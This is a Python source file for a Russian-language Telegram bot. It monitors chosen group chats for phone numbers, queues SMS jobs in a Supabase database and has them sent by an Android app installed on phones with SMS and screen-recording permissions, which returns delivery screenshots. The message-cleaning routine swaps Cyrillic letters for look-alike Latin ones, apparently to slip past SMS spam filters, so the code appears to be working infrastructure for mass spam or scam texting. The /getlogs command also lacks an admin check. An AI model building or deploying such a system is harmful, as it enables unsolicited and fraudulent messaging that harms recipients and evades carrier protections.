import os
import asyncio
import aiohttp
import base64
import json
import re
from datetime import datetime, date
from pathlib import Path
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import (
    Message, BufferedInputFile, InlineKeyboardMarkup,
    InlineKeyboardButton, CallbackQuery, FSInputFile
)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

DATA_FILE = "data.json"
processed_ids = set()
processed_screenshots = set()

def load_data():
    if Path(DATA_FILE).exists():
        return json.load(open(DATA_FILE, "r", encoding="utf-8"))
    return {
        "admin_ids": [int(os.getenv("ADMIN_CHAT_ID", "0"))],
        "target_groups": {}
    }

def save_data(d):
    json.dump(d, open(DATA_FILE, "w", encoding="utf-8"), ensure_ascii=False, indent=2)

data = load_data()

def is_admin(user_id: int) -> bool:
    return user_id in data.get("admin_ids", [])

def clean_phone(raw):
    digits = ''.join(c for c in raw if c.isdigit())
    if len(digits) == 11 and digits[0] in "78":
        return "+7" + digits[1:]
    if len(digits) == 10 and digits[0] == '9':
        return "+7" + digits
    return None

# ---------- Клавиатуры ----------
def admin_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👁 Управление группами", callback_data="groups_menu")],
        [InlineKeyboardButton(text="👑 Администраторы", callback_data="admins_menu"),
         InlineKeyboardButton(text="📊 Отчёты", callback_data="reports_menu")],
        [InlineKeyboardButton(text="🛠 Сброс статистики", callback_data="reset_menu")],
        [InlineKeyboardButton(text="💾 Экспорт/Импорт БД", callback_data="db_menu")],
        [InlineKeyboardButton(text="📱 Логи телефона", callback_data="get_logs")],
    ])

def groups_menu_keyboard():
    kb = [
        [InlineKeyboardButton(text="➕ Включить слежение", callback_data="group_add")],
        [InlineKeyboardButton(text="➖ Отключить слежение", callback_data="group_remove")],
        [InlineKeyboardButton(text="📋 Список групп", callback_data="group_list")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def admins_menu_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Добавить админа", callback_data="admin_add")],
        [InlineKeyboardButton(text="➖ Удалить админа", callback_data="admin_remove")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")]
    ])

def reports_menu_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Полный отчёт", callback_data="report_full")],
        [InlineKeyboardButton(text="📅 За сегодня", callback_data="report_today")],
        [InlineKeyboardButton(text="📆 За дату", callback_data="report_date")],
        [InlineKeyboardButton(text="✅ Только успешные", callback_data="report_success")],
        [InlineKeyboardButton(text="📥 Выгрузить TXT", callback_data="export_menu")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")]
    ])

def export_menu_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📄 За всё время", callback_data="export_all")],
        [InlineKeyboardButton(text="📄 За сегодня", callback_data="export_today")],
        [InlineKeyboardButton(text="📄 Успешные", callback_data="export_success")],
        [InlineKeyboardButton(text="📄 За дату", callback_data="export_date_prompt")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="reports_menu")]
    ])

def reset_menu_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="♻ Сбросить всё", callback_data="reset_all")],
        [InlineKeyboardButton(text="♻ Сбросить за сегодня", callback_data="reset_today")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")]
    ])

def db_menu_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📥 Выгрузить базу (JSON)", callback_data="db_export")],
        [InlineKeyboardButton(text="📤 Загрузить базу (JSON)", callback_data="db_import")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")]
    ])

# ---------- /start ----------
@dp.message(Command("start"))
async def start_command(message: Message):
    if is_admin(message.from_user.id):
        await message.reply("🔐 Админ-панель:", reply_markup=admin_main_keyboard())
    else:
        text = (
            "👋 <b>SMS-рассылка через Telegram-бота</b>\n\n"
            "📲 <b>Как установить приложение на телефон:</b>\n"
            "1. Скачай APK-файл и установи его\n"
            "2. Обязательно выдай все запрашиваемые разрешения (SMS, запись экрана)\n"
            "3. Нажми «📸 Разрешить скриншоты» и прими системный диалог\n"
            "4. Нажми «🚀 Запустить сервис»\n"
            "5. Если нужно выключить – нажми «🛑 Остановить сервис»\n\n"
            "🤖 <b>Как добавить бота в группу:</b>\n"
            "– Добавь бота в группу\n"
            "– Напиши <code>/look</code> (только для администраторов)\n"
            "– После этого все номера в группе будут обрабатываться автоматически"
        )
        await message.reply(text, parse_mode="HTML")

# ---------- /look ----------
@dp.message(Command("look"))
async def look_command(message: Message):
    if not is_admin(message.from_user.id):
        return
    if message.chat.type not in ["group", "supergroup"]:
        await message.reply("Эту команду можно использовать только в группе.")
        return
    gid = str(message.chat.id)
    if gid in data["target_groups"]:
        del data["target_groups"][gid]
        save_data(data)
        await message.reply("🛑 Слежение за группой отключено.")
    else:
        data["target_groups"][gid] = message.chat.title or "Без названия"
        save_data(data)
        await message.reply("👁 Слежение за группой включено.")

# ---------- /getlogs ----------
@dp.message(Command("getlogs"))
async def get_logs(message: Message):
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{SUPABASE_URL}/rest/v1/logs?select=log_text&order=created_at.desc&limit=20",
            headers=headers
        ) as resp:
            if resp.status == 200:
                data_logs = await resp.json()
                if data_logs:
                    log_text = "\n".join([entry["log_text"] for entry in reversed(data_logs)])
                    with open("phone_logs.txt", "w", encoding="utf-8") as f:
                        f.write(log_text)
                    await message.reply_document(FSInputFile("phone_logs.txt"), caption="📱 Логи с телефона")
                else:
                    await message.reply("Логов пока нет.")
            else:
                await message.reply("Ошибка получения логов.")

# ---------- Callback-обработчики ----------
@dp.callback_query()
async def callback_handler(callback: CallbackQuery):
    await callback.answer()
    uid = callback.from_user.id
    cmd = callback.data

    if not is_admin(uid):
        await callback.message.reply("⛔ У вас нет прав администратора.")
        return

    if cmd == "main_menu":
        await callback.message.edit_text("🔐 Админ-панель:", reply_markup=admin_main_keyboard())
    elif cmd == "get_logs":
        await get_logs(callback.message)
    elif cmd == "groups_menu":
        await callback.message.edit_text("👁 Управление группами:", reply_markup=groups_menu_keyboard())
    elif cmd == "admins_menu":
        await callback.message.edit_text("👑 Администраторы:", reply_markup=admins_menu_keyboard())
    elif cmd == "reports_menu":
        await callback.message.edit_text("📊 Отчёты:", reply_markup=reports_menu_keyboard())
    elif cmd == "reset_menu":
        await callback.message.edit_text("♻ Сброс статистики:", reply_markup=reset_menu_keyboard())
    elif cmd == "db_menu":
        await callback.message.edit_text("💾 Экспорт/Импорт базы данных:", reply_markup=db_menu_keyboard())
    elif cmd == "db_export":
        await export_database(callback.message)
    elif cmd == "db_import":
        await callback.message.reply("Отправь JSON-файл базы данных в этом чате.")

    # Группы
    elif cmd == "group_add":
        await callback.message.answer("ℹ️ Перейди в нужную группу и напиши /look")
    elif cmd == "group_remove":
        if not data["target_groups"]:
            await callback.message.answer("Нет отслеживаемых групп.")
            return
        kb = []
        for gid, title in data["target_groups"].items():
            kb.append([InlineKeyboardButton(text=f"❌ {title}", callback_data=f"grp_rm_{gid}")])
        kb.append([InlineKeyboardButton(text="🔙 Назад", callback_data="groups_menu")])
        await callback.message.edit_text("Выбери группу для удаления:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    elif cmd.startswith("grp_rm_"):
        gid = cmd[7:]
        if gid in data["target_groups"]:
            del data["target_groups"][gid]
            save_data(data)
            await callback.message.answer("Группа удалена.")
        await callback.message.edit_text("👁 Управление группами:", reply_markup=groups_menu_keyboard())
    elif cmd == "group_list":
        if not data["target_groups"]:
            await callback.message.answer("Нет групп.")
        else:
            text = "📋 <b>Отслеживаемые группы:</b>\n"
            for gid, title in data["target_groups"].items():
                text += f"• {title} (<code>{gid}</code>)\n"
            await callback.message.answer(text, parse_mode="HTML")

    # Админы
    elif cmd == "admin_add":
        await callback.message.answer("Используй команду /addadmin <id>")
    elif cmd == "admin_remove":
        await callback.message.answer("Используй команду /removeadmin <id>")

    # Отчёты
    elif cmd == "report_full":
        await send_report(callback.message, "all")
    elif cmd == "report_today":
        await send_report(callback.message, "day")
    elif cmd == "report_date":
        await callback.message.reply("Введи дату в формате ДД-ММ-ГГГГ")
    elif cmd == "report_success":
        await send_report(callback.message, "success")
    elif cmd == "export_menu":
        await callback.message.edit_text("📥 Выгрузить TXT:", reply_markup=export_menu_keyboard())
    elif cmd == "export_all":
        await export_txt(callback.message, "all")
    elif cmd == "export_today":
        await export_txt(callback.message, "day")
    elif cmd == "export_success":
        await export_txt(callback.message, "success")
    elif cmd == "export_date_prompt":
        await callback.message.reply("Введи дату ДД-ММ-ГГГГ:")
    elif cmd == "reset_all":
        await confirm_action(callback.message, "reset_all", "сбросить ВСЮ статистику")
    elif cmd == "reset_today":
        await confirm_action(callback.message, "reset_today", "сбросить статистику за сегодня")
    elif cmd.startswith("confirm_"):
        action = cmd[8:]
        await callback.message.edit_text("Выполняю...")
        await execute_reset(callback.message, action)
    elif cmd == "cancel_reset":
        await callback.message.edit_text("Сброс отменён.", reply_markup=reset_menu_keyboard())

# ---------- Команды администрирования ----------
@dp.message(Command("addadmin"))
async def add_admin(message: Message):
    if not is_admin(message.from_user.id): return
    try:
        new_id = int(message.text.split()[1])
    except (IndexError, ValueError):
        await message.reply("Используй: /addadmin <id>")
        return
    if new_id not in data["admin_ids"]:
        data["admin_ids"].append(new_id)
        save_data(data)
        await message.reply(f"✅ Админ {new_id} добавлен.")
    else:
        await message.reply("Этот пользователь уже админ.")

@dp.message(Command("removeadmin"))
async def remove_admin(message: Message):
    if not is_admin(message.from_user.id): return
    try:
        rm_id = int(message.text.split()[1])
    except (IndexError, ValueError):
        await message.reply("Используй: /removeadmin <id>")
        return
    main_admin = int(os.getenv("ADMIN_CHAT_ID", "0"))
    if rm_id == main_admin:
        await message.reply("Нельзя удалить главного администратора.")
        return
    if rm_id in data["admin_ids"]:
        data["admin_ids"].remove(rm_id)
        save_data(data)
        await message.reply(f"❌ Админ {rm_id} удалён.")
    else:
        await message.reply("Такого админа нет.")

# ---------- Экспорт базы данных ----------
async def export_database(msg: Message):
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    tables = ["tasks", "logs"]
    export_data = {}
    async with aiohttp.ClientSession() as session:
        for table in tables:
            async with session.get(f"{SUPABASE_URL}/rest/v1/{table}?select=*", headers=headers) as resp:
                if resp.status == 200:
                    export_data[table] = await resp.json()
                else:
                    await msg.reply(f"Ошибка экспорта таблицы {table}: {resp.status}")
                    return
    export_data["settings"] = load_data()
    filename = f"db_export_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.json"
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(export_data, f, ensure_ascii=False, indent=2)
    await msg.reply_document(FSInputFile(filename), caption="✅ База данных выгружена")

# ---------- Импорт базы данных ----------
@dp.message(lambda msg: msg.document and msg.document.file_name.endswith(".json"))
async def handle_json_upload(message: Message):
    if not is_admin(message.from_user.id): return
    file_id = message.document.file_id
    file = await bot.get_file(file_id)
    file_path = file.file_path
    await bot.download_file(file_path, "import.json")
    try:
        with open("import.json", "r", encoding="utf-8") as f:
            import_data = json.load(f)
    except Exception as e:
        await message.reply(f"Ошибка чтения файла: {e}")
        return
    headers = {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=minimal"
    }
    async with aiohttp.ClientSession() as session:
        if "tasks" in import_data:
            for task in import_data["tasks"]:
                task.pop("id", None)
                async with session.post(f"{SUPABASE_URL}/rest/v1/tasks", json=task, headers=headers) as resp:
                    if resp.status not in [200, 201]:
                        await message.reply(f"Ошибка импорта tasks: {resp.status}")
                        return
        if "logs" in import_data:
            for log in import_data["logs"]:
                log.pop("id", None)
                async with session.post(f"{SUPABASE_URL}/rest/v1/logs", json=log, headers=headers) as resp:
                    if resp.status not in [200, 201]:
                        await message.reply(f"Ошибка импорта logs: {resp.status}")
                        return
        if "settings" in import_data:
            save_data(import_data["settings"])
            global data
            data = import_data["settings"]
    await message.reply("✅ База данных успешно импортирована!")
    os.remove("import.json")

# ---------- Обработка сообщений в группах ----------
@dp.message()
async def handle_any_message(message: Message):
    text = message.text.strip() if message.text else ""
    if re.match(r"\d{2}-\d{2}-\d{4}", text):
        try:
            dt = datetime.strptime(text, "%d-%m-%Y").date()
            if "export" in text.lower():
                await export_txt(message, "date", dt)
            else:
                await send_report(message, "date", dt)
        except ValueError:
            await message.reply("Неверный формат даты.")
        return
    if str(message.chat.id) not in data.get("target_groups", {}):
        return
    phone = None
    for word in text.split():
        p = clean_phone(word.strip().replace(",", "").replace(".", "").replace(")", "").replace("(", ""))
        if p:
            phone = p
            break
    if not phone:
        return
    pattern = re.escape(phone) + r'|' + re.escape(phone[1:]) + r'|' + re.escape('8' + phone[2:])
    template = re.sub(pattern, '', text, count=1).strip() or "Сообщение"
    # Очистка Unicode + замена 40% кириллицы на латиницу
    template = re.sub(r'[^а-яА-ЯёЁa-zA-Z0-9\s\.\,\!\?\:\;\-\+\@\#\$\%\^\&\*\(\)\_\=\/\\\|«»\"\']', '', template)
    template = re.sub(r'\s+', ' ', template).strip()
    if not template:
        template = "Сообщение"
    translit_map = {
        'а': 'a', 'е': 'e', 'о': 'o', 'р': 'p', 'с': 'c', 'у': 'y', 'х': 'x',
        'А': 'A', 'В': 'B', 'Е': 'E', 'О': 'O', 'Р': 'P', 'С': 'C', 'Т': 'T', 'У': 'Y', 'Х': 'X',
        'и': 'u', 'к': 'k', 'м': 'm', 'н': 'H', 'т': 't'
    }
    chars = list(template)
    count = 0
    for i in range(len(chars)):
        if chars[i] in translit_map and count % 3 == 0:
            chars[i] = translit_map[chars[i]]
        if chars[i].isalpha() and ord(chars[i]) > 127:
            count += 1
    template = ''.join(chars)
    headers = {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=minimal"
    }
    payload = {
        "phone": phone,
        "template": template,
        "group_id": str(message.chat.id)
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(f"{SUPABASE_URL}/rest/v1/tasks", json=payload, headers=headers) as resp:
            if resp.status == 201:
                await message.reply(f"🔄 Задача добавлена: {phone}")
            else:
                await message.reply("❌ Ошибка добавления задачи")

# ---------- Вспомогательные функции ----------
async def fetch_tasks(params=""):
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{SUPABASE_URL}/rest/v1/tasks?{params}", headers=headers) as resp:
            if resp.status == 200:
                return await resp.json()
            return []

async def send_report(msg: Message, mode: str, date_val=None):
    if mode == "all":
        tasks = await fetch_tasks("select=*&order=created_at.desc&limit=20")
    elif mode == "day":
        today = date.today().isoformat()
        tasks = await fetch_tasks(f"select=*&created_at=gte.{today}&order=created_at.desc&limit=20")
    elif mode == "success":
        tasks = await fetch_tasks("select=*&status=eq.success&order=created_at.desc&limit=20")
    elif mode == "date" and date_val:
        day_str = date_val.isoformat()
        tasks = await fetch_tasks(f"select=*&created_at=gte.{day_str}&created_at=lt.{day_str}T23:59:59&order=created_at.desc&limit=20")
    else:
        tasks = []
    if not tasks:
        await msg.reply("Нет данных.")
        return
    total = len(tasks)
    success = sum(1 for t in tasks if t["status"] == "success")
    failed = total - success
    lines = [f"📊 Всего: {total} | ✅ {success} | ❌ {failed}\n"]
    for t in tasks[:10]:
        icon = "✅" if t["status"] == "success" else "❌"
        time_str = t.get("created_at", "")[:19].replace("T", " ")
        lines.append(f"{icon} {t['phone']} | {t['template'][:25]} | {time_str}")
    await msg.reply("\n".join(lines))

async def export_txt(msg: Message, mode: str, date_val=None):
    if mode == "all":
        tasks = await fetch_tasks("select=*&order=created_at.desc")
        fname = "full_report.txt"
    elif mode == "day":
        today = date.today().isoformat()
        tasks = await fetch_tasks(f"select=*&created_at=gte.{today}")
        fname = f"report_{today}.txt"
    elif mode == "success":
        tasks = await fetch_tasks("select=*&status=eq.success")
        fname = "success_report.txt"
    elif mode == "date" and date_val:
        day_str = date_val.isoformat()
        tasks = await fetch_tasks(f"select=*&created_at=gte.{day_str}&created_at=lt.{day_str}T23:59:59")
        fname = f"report_{day_str}.txt"
    else:
        tasks = []
        fname = "report.txt"
    if not tasks:
        await msg.reply("Нет данных.")
        return
    text = "\n".join(
        f"{'✅' if t['status']=='success' else '❌'} {t['phone']} | {t['template'][:30]} | {t.get('created_at','')}"
        for t in tasks
    )
    with open(fname, "w", encoding="utf-8") as f:
        f.write(text)
    await msg.reply_document(FSInputFile(fname))

async def confirm_action(msg: Message, action: str, description: str):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"confirm_{action}")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_reset")]
    ])
    await msg.reply(f"Вы уверены, что хотите {description}?", reply_markup=kb)

async def execute_reset(msg: Message, action: str):
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    url = f"{SUPABASE_URL}/rest/v1/tasks"
    if action == "reset_all":
        async with aiohttp.ClientSession() as session:
            async with session.delete(url, headers=headers) as resp:
                await msg.reply("✅ Статистика полностью сброшена.")
    elif action == "reset_today":
        today = date.today().isoformat()
        async with aiohttp.ClientSession() as session:
            async with session.delete(f"{url}?created_at=gte.{today}", headers=headers) as resp:
                await msg.reply("✅ Статистика за сегодня сброшена.")

# ---------- Фоновый опрос результатов ----------
async def check_completed_tasks():
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"{SUPABASE_URL}/rest/v1/tasks?select=*&screenshot=not.is.null&order=created_at.desc&limit=5",
                    headers=headers
                ) as resp:
                    if resp.status == 200:
                        tasks = await resp.json()
                        for task in tasks:
                            tid = task["id"]
                            if tid in processed_screenshots:
                                continue
                            processed_screenshots.add(tid)
                            phone = task["phone"]
                            status = task["status"]
                            screenshot_b64 = task.get("screenshot")
                            target = task.get("group_id")
                            if not target:
                                continue
                            if screenshot_b64:
                                scr = base64.b64decode(screenshot_b64)
                                cap = f"✅ Доставлено: {phone}" if status == "success" else f"❌ Сбой: {phone}"
                                await bot.send_photo(int(target), BufferedInputFile(scr, "screen.jpg"), caption=cap)
                async with session.get(
                    f"{SUPABASE_URL}/rest/v1/tasks?select=*&status=in.(success,failed)&screenshot=is.null&order=created_at.desc&limit=5",
                    headers=headers
                ) as resp:
                    if resp.status == 200:
                        tasks = await resp.json()
                        for task in tasks:
                            tid = task["id"]
                            if tid in processed_ids:
                                continue
                            processed_ids.add(tid)
                            phone = task["phone"]
                            status = task["status"]
                            target = task.get("group_id")
                            if not target:
                                continue
                            txt = f"✅ Доставлено: {phone}" if status == "success" else f"❌ Сбой: {phone}"
                            await bot.send_message(int(target), txt)
        except Exception as e:
            print("Checker error:", e)
        await asyncio.sleep(3)

async def main():
    asyncio.create_task(check_completed_tasks())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
